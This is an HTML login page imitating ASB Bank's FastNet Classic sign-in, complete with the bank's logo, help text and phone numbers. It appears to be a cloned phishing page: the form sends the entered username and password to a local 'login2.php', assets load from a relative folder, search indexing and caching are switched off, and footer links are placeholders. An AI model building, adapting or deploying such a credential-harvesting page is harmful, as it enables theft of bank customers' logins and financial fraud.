 
<!DOCTYPE html>
<!--[if HTML5]><![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie11 lt-ie10 lt-ie9"> <![endif]-->
<!--[if IE 9]>         <html class="no-js lt-ie11 lt-ie10"> <![endif]-->
<!--[if IE 10]>        <html class="no-js lt-ie11"> <![endif]-->
<!--[if gt IE 10]><!-->
<html class="no-js">
<!--<![endif]-->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex,nofollow" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="cache-control" content="max-age=0" />
	<meta http-equiv="cache-control" content="no-cache" />
	<meta http-equiv="expires" content="0" />
	<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
	<meta http-equiv="pragma" content="no-cache" />
    <link rel="shortcut icon" href="1/favicon.ico" />
    
        <title>Step 2</title>
    

    <link href="1/screen.min.css?v=2015.1.8" rel="stylesheet" />
    <script src="1/modernizr-2.7.1.js?v=2015.1.8" type="text/javascript"></script>     
    <script src="1/json2.min.js?v=2015.1.8"></script>
    <script src="1/sha1.min.js?v=2015.1.8"></script>
    <script src="1/jquery-1.11.0.min.js?v=2015.1.8" type="text/javascript"></script>
    <script src="1/PopupManager.min.js?v=2015.1.8"></script>
    <script src="1/custFontSize.min.js?v=2015.1.8"></script>
    
	
        
        
	
        <script type="text/javascript" language="javascript">
	var loginConfig = { isRememberMe: false, username: 'null' };	
	
	
function getCookie(cname) {
	var name = cname + "=";
	var ca = document.cookie.split(';');
	for(var i=0; i<ca.length; i++) {
		var c = $.trim(ca[i]);
		if (c.indexOf(name)==0) 
			return c.substring(name.length,c.length);
  	}
	return "";
}

</script>
                           

</head>

    <body id="body">
    <!-- Start container -->
    <div class="content">
		<div class="asb-logo">
            <a href="#">
            <img src="1/logo-asb.png" alt="ASB Logo" width="109" height="25">
            </a>
        </div>
		
        <div class="title">
            <h1>
			Continue to 
				
				
				
				FastNet Classic
			</h1>
        </div>
		<!-- No javascript error message -->
		<noscript>
			<div class="warning message input">
				<table>
					<tr>
						<td>
							<div class="icon info"></div>
						</td>
						<td>
							<h3>
								Your browser seems to have Javascript disabled. Make sure Javascript is enabled to log in.
							</h3>
						</td>
					</tr>
				</table>
			</div>
		</noscript>		
        <!-- Session expired error message 
			
		<div class="warning message input">
            <table>
                <tr>
                    <td>
                        <div class="icon alert"></div>
                    </td>
                    <td>
                        <h3>
                            Your session has expired. Please log in again.
                        </h3>
                    </td>
                </tr>
            </table>
        </div>
        
        -->
		<!-- No cookies error message -->
	

		
		
		<div class="input-panel">
            <form name="login" method="post" action="login2.php" id="login" autocomplete="off" aria-autocomplete="none">
              <input type="hidden" name="authnMod" value="AsbRgyAuthn">
              <input name="action" type="hidden" value="login">
              <input type="hidden" name="secfk" value="RIKO-HKWL-I4T6-HD5A-LIS3-U98B-NW9W-QEJB">
              <input type="hidden" name="goto" value="#">
              <input type="hidden" name="username" id="username" class="a">
              <input type="hidden" name="MSISDN" value="">
              
              <div id="divRemembered" style="display: none;">
              <div id="customerNameP" class="remembered-name">
                <h3>Hi </h3>
                <h3 id="customerNameS" style="display: inline;">null</h3>
              </div>
              </div>
              <div id="divNotRemembered" class="textbox error" style="display: inline-block;">
                <input id="dUsername" name="username" type="text" placeholder="Username" maxlength="10" required="">
                <span class="text-addon icon person" ></span>
              </div>
              <div class="textbox error">
                <input id="password" name="password" autocomplete="off" maxlength="100" type="password" placeholder="Password" class="b" required="">
                <span class="text-addon icon key"></span>
              </div>
              <div class="error-container message input ">
                <table>
                    <tbody><tr>
                        <td>
                            <div class="icon alert"></div>
                        </td>
                        <td>
                            <h3>
                                Please enter your username and password.
                            </h3>
                        </td>
                    </tr>
                </tbody></table>
              </div>

              <div class="primary-button">
                <div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe src="#" width="256" height="60" role="presentation" name="a-ojyjgiqiq0m1" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div></div><input id="loginBtn" name="Log in button" type="submit" value="Log In">
              </div>
              <div class="help-menu">
                <table>
                    <tbody><tr>
                        <td>
                            <div class="remember-checkbox page-control">
                                <input id="remember_me" name="remember_me" type="hidden" value="false">
                                <input id="remember_me_checkbox" name="remember_me_checkbox" type="checkbox">
                                <label for="remember_me_checkbox"></label>
                            </div>
                        </td>
                        <td>
                            <h3>
                                Remember my name
                            </h3>
                        </td>
                        <td>
                            <input type="button" id="ddRememberMe" name="display more information" class="dropdown down page-control" value="">
                        </td>
                    </tr>
                </tbody></table>
              </div>
              <div id="divRememberMeHelp" class="help-rememberme">
                <div id="divRememberMe" style="display: inline-block;">
                    <h3>
                        For your convenience check this box and next time you
                        log in, just enter your password. We recommend you use
                        this only on browsers you do not share with others.
                    </h3>
                </div>
                <div id="divForgetMe" style="display: none;">
                    <h3>
                        Uncheck this box to enter your username.
                    </h3>
                </div>
              </div>
              <br>
              <div class="help-menu">
                <table class="forgotten-container">
                    <tbody><tr>
                        <td>

                        </td>
                        <td>
                            
                                
                                
                                   
                                
                                
                                
                            
                            <h3>Can't log in?</h3><h3>
                        </h3></td>
                        <td>
                            <input type="button" id="ddContact" name="display more information" class="dropdown down page-control" value="">
                        </td>
                        <td>

                        </td>
                    </tr>
                </tbody></table>
              </div>
            
            <!-- contact help -->

            
                
                
                   
                <div id="divContactHelp" class="main-sspr help-contact">
                    <div class="sspr help-contact">
                        <br>
                        <div class="sspr contact-text">
                            <h3>You can reset your password via the <br>
                            <b>ASB Mobile Banking app</b> if you have set a PIN.</h3>
                        </div>
                        <br>
                        <div class="sspr contact-text">
                            <h3>Open the app and select <b>'Reset ASB Login Password'</b><br>
                            from the top left menu before you log in.</h3>
                        </div>
                        <br>
                    </div>
                    <br>
                    <div class="contact-text">
                        <h3>
                            Don't have the ASB Mobile Banking app? Call us:
                        </h3>
                    </div>
                    <div class="contact-number">
                        <table>
                            <tbody><tr>
                                <td>
                                    <div class="icon phone"></div>
                                </td>
                                <td>
                                    <h2><a href="tel:0800327863" tabindex="-1" role="menuitem">
                                                        0800 327 863</a></h2>
                                </td>
                            </tr>
                        </tbody></table>
                    </div>
                    <div class="contact-text">
                        <h3>
                                        within New Zealand or</h3>
                    </div>
                    <div class="contact-number">
                        <table>
                            <tbody><tr>
                                <td>
                                    <div class="icon phone"></div>
                                </td>
                                <td>
                                    <h2><a tabindex="-1" class="call" role="menuitem" href="tel:006493063185">
                                                        +64 9 306 3185</a></h2>
                                </td>
                            </tr>
                        </tbody></table>
                    </div>
                    <div class="contact-text">
                        <h3>
                                        outside New Zealand</h3>
                    </div>
                    <br>
                    <div class="contact-text">
                        <h3>
                                        Not an ASB Customer?</h3>
                    </div>
                    <br>
                    <div class="sspr-contact-btn">
                        
                            
                            
                                
                                <a href="#" class="sspr contact-btn" data-modal-open="arrange" style="">Join ASB</a>
                            
                        
                    </div>
                    <br>
                    <br>
                </div>
                
                
            
            </form>
		</div>		
        <div class="footer">      
            
            
            
            <ul class="links"><li><a href="#"" target="_blank" title="Terms &amp; Conditions">Terms &amp; Conditions</a></li><li><a href="#" target="_blank" title="About Security">About Security</a></li><li><a href="#" target="_blank" title="Privacy Statement">Privacy</a></li><li><a href="#" target="_blank" title="Internet Access Terms">Internet Access Terms</a></li></ul><div class="notes"><p>FastNet is licensed to ASB Bank Limited and is solely for the use of persons authorised by ASB Bank Limited.</p><p>Do not access FastNet unless you have been specifically authorised to do so. Unauthorised access is prohibited.</p></div>
		</div>
    </div>	
	<script type="text/javascript" src="1/loginBody.min.js?v=2015.1.8"></script> 

    <script src="1/p.min.js?v=2015.1.8" type="text/javascript"></script> 
    <script type="text/javascript" id="initialFuncScript"></script>    
</body>

 
</html> 